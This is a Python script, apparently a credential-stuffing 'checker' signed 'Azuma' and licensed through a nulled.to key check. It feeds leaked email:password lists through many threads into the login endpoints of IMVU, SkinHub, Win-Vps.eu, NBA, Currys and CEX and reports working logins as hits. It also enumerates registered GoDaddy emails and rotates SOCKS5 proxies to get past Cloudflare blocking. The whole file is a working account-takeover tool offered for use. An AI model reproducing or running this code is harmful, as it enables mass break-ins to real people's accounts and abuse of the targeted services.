#hi robert :
import requests
import time
import os
import random
import hashlib
from multiprocessing import Pool
from multiprocessing.dummy import Pool as ThreadPool
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

os.system('clear')


def imvustart():
  filename = input("Filename > ")
  threadamt = int(input("Thread Amount > "))
  f = open(filename)
  lines = f.readlines()
  pool = ThreadPool(threadamt)
  results = pool.map(imvuchecker, lines)

def imvuchecker(line):
  line = line.strip('\n')
  line2 = line.split(':')
  email = line2[0]
  password = line2[1]
  headers = {
      'authority': 'api.imvu.com',
      'accept': 'application/json; charset=utf-8',
      'x-imvu-application': 'welcome/1',
      'user-agent': 'Mozilla/5.0 (X11; CrOS x86_64 12964.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4079.0 Safari/537.36',
      'content-type': 'application/json; charset=UTF-8',
      'origin': 'https://secure.imvu.com',
      'sec-fetch-site': 'same-site',
      'sec-fetch-mode': 'cors',
      'sec-fetch-dest': 'empty',
      'referer': 'https://secure.imvu.com/welcome/ftux/',
      'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',

  }

  data = {
    "username":email,
    "password":password,
    "gdpr_cookie_acceptance":True
  }

  response = requests.post('https://api.imvu.com/login', headers=headers, json=data)
  if "Invalid email or password" in response.text:
    print("[BAD] " + line)
  elif """{"status":"success""" in response.text:
    print("[HIT] " + line)
  
def gdemailstart():
  filename = input("Filename (Just emails, no passwords) > ")
  threadamt = int(input("Thread Amount > "))
  f = open(filename)
  lines = f.readlines()
  pool = ThreadPool(threadamt)
  results = pool.map(gdemailchecker, lines)

def gdemailchecker(line):
  line = line.strip('\n')
  cookies = {
      'AKA_A2': 'A',
      'currency': 'USD',
      'xpdpp3': 'B',
      'xpsubnav': 'B',
      'xpnss2': 'B',
      'xphit': 'B',
      'market': 'en-GB',
      'traffic': '',
  }

  headers = {
      'Connection': 'keep-alive',
      'Accept': 'application/json',
      'User-Agent': 'Mozilla/5.0 (X11; CrOS x86_64 12964.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4079.0 Safari/537.36',
      'Content-Type': 'application/json',
      'Origin': 'https://sso.godaddy.com',
      'Sec-Fetch-Site': 'same-origin',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Dest': 'empty',
      'Referer': 'https://sso.godaddy.com/?realm=idp&path=%2Fproducts&app=account',
      'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
  }

  data = {
    "checkusername":line
  }

  response = requests.post('https://sso.godaddy.com/v1/api/idp/user/checkusername', headers=headers, cookies=cookies, json=data)
  if "is available" in response.text:
    print("Email is not registered | " + line)
  elif "is unavailable" in response.text:
    print("Email is registered! | " + line)
  
def skinhubstart():
  filename = input("Filename > ")
  threadamt = int(input("Thread Amount > "))
  f = open(filename)
  lines = f.readlines()
  pool = ThreadPool(threadamt)
  results = pool.map(skinhubchecker, lines)

def skinhubchecker(line):
  line = line.strip('\n')
  line2 = line.split(':')
  email = line2[0]
  password = line2[1]
  headers = {
      'authority': 'api.skinhub.com',
      'accept': 'application/json, text/javascript',
      'user-agent': 'Mozilla/5.0 (X11; CrOS x86_64 12964.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4079.0 Safari/537.36',
      'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'origin': 'https://skinhub.com',
      'sec-fetch-site': 'same-site',
      'sec-fetch-mode': 'cors',
      'sec-fetch-dest': 'empty',
      'referer': 'https://skinhub.com/',
      'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
  }

  data = {
    "user[password]":password,
    "user[email]":email
  }

  response = requests.post('https://api.skinhub.com/api/users/sign_in', headers=headers, data=data)
  if """isAuthorized":true""" in response.text:
    print("[HIT] " + line)
  elif "Wrong authentication information" in response.text:
    print("[BAD] " + line)
  
def winvpsstart():
  filename = input("Filename > ")
  threadamt = int(input("Thread Amount > "))
  f = open(filename)
  lines = f.readlines()
  pool = ThreadPool(threadamt)
  results = pool.map(winvpschecker, lines)

def winvpschecker(line):
  line2 = line.split(":")
  email = line2[0]
  password = line2[1]
  r = requests.get("https://www.win-vps.eu/dologin.php?username=" + email + "&password=" + password)
  if r.url == "https://www.win-vps.eu/clientarea.php?incorrect=true":
    print("[BAD] " + line)
  elif r.url == "https://www.win-vps.eu/clientarea.php":
    print("[HIT] " + line)

def nbastart():
  filename = input("Filename > ")
  threadamt = int(input("Thread Amount > "))
  f = open(filename)
  lines = f.readlines()
  pool = ThreadPool(threadamt)
  results = pool.map(nbachecker, lines)

def nbachecker(line):
  line = line.strip('\n')
  line2 = line.split(":")
  email = line2[0]
  password = line2[1]
  headers = {
      'Connection': 'keep-alive',
      'User-Agent': 'Mozilla/5.0 (X11; CrOS x86_64 12964.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4079.0 Safari/537.36',
      'Content-type': 'application/json',
      'Accept': '*/*',
      'Origin': 'https://www.nba.com',
      'Sec-Fetch-Site': 'same-site',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Dest': 'empty',
      'Referer': 'https://www.nba.com/',
      'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
  }

  data = {
    "principal":email,
    "credential":password,
    "identityType":"EMAIL",
    "apps":["responsys","billing","preferences"]
  }

  response = requests.post('https://audience.nba.com/core/api/1/user/login', headers=headers, json=data)
  if "nba.authn" in response.text:
    print("[HIT] " + line)
  if "User credentials are invalid." in response.text:
    print("[BAD] " + line)

def currysstart():
    os.system('clear')
    print("Currys Checker - Coded by Azuma")
    filename = input("Filename > ")
    threadamt = int(input("Thread Amount > "))
    f = open(filename)
    lines = f.readlines()
    os.system('clear')
    print("Initializing Threads - Currys Checker will start in 5 seconds")
    time.sleep(5)
    os.system('clear')
    pool = ThreadPool(threadamt)
    results = pool.map(curryschecker, lines)

def curryschecker(line):
    r = requests.post("https://api.currys.co.uk/store/api/token")
    line = line.strip('\n')
    line2 = line.split(":")
    email = line2[0]
    password = line2[1]
    data = {
        "customerEmail":email,
        "customerPassword":password,
        "customerRememberMe":"true"
    }

    r2 = requests.post("https://api.currys.co.uk/store/api/token", headers=r.headers, cookies=r.cookies, json=data)

    if """{"bid":""" in r2.text:
        print("[HIT] " + line)
    elif "authenticationFailed" in r2.text:
        print("[BAD] " + line)
    
def cexstart():
    global plines
    os.system('clear')
    print("CEX Checker - Coded by Azuma")
    filename = input("Filename > ")
    proxyfile = input("Proxy filename > ")
    threadamt = int(input("Thread Amount > "))
    f = open(filename)
    pf = open(proxyfile)
    plines = pf.readlines()
    lines = f.readlines()
    os.system('clear')
    print("Initializing Threads - CEX Checker will start in 5 seconds")
    time.sleep(5)
    os.system('clear')
    pool = ThreadPool(threadamt)
    results = pool.map(cexchecker, lines)

def cexchecker(line):
    proxy = random.choice(plines)
    proxy = proxy.strip('\n')
    line = line.strip('\n')
    line2 = line.split(':')
    email = line2[0]
    password = line2[1]
    data = {
        "email":email,
        "password":password,
        "acceptAgreement":"1"
    }
    r = requests.post("https://wss2.cex.uk.webuy.io/v3/members/login", json=data, verify=False, proxies={
					"https": "socks5://" + proxy
	})
    if "Invalid credentials" in r.text:
        print("[BAD] " + line)
    elif "Success" in r.text:
        print("[HIT] " + line)
    elif "Cloudflare Ray ID" in r.text:
        print("[ERROR] CloudFlare has blocked this proxy - " + str(proxy))

def option():
    option = input("Made by Azuma with <3\n\nChoose module: \n\n[1] IMVU\n[2] GoDaddy Email Checker\n[3] SkinHub\n[4] Win-Vps.eu\n[5] NBA\n[6] Currys.co.uk\n[7] CEX\n")
    if option == "1":
        imvustart()
    if option == "2":
        gdemailstart()
    if option == "3":
        skinhubstart()
    if option == "4":
        winvpsstart()
    if option == "5":
        nbastart()
    if option == "6":
        currysstart()
    if option == "7":
        cexstart()
    
auth = input("Auth key > ")

hash1 = hashlib.md5(auth.encode()) 
hash2 = hash1.hexdigest() 

r = requests.get("https://www.nulled.to/misc.php?action=validateKey&authKey=" + str(hash2))
if "success" in r.text:
    print("Success! Redirecting to tool now...")
    os.system('clear')
    option()
else:
    print("Wrong auth key")
    quit()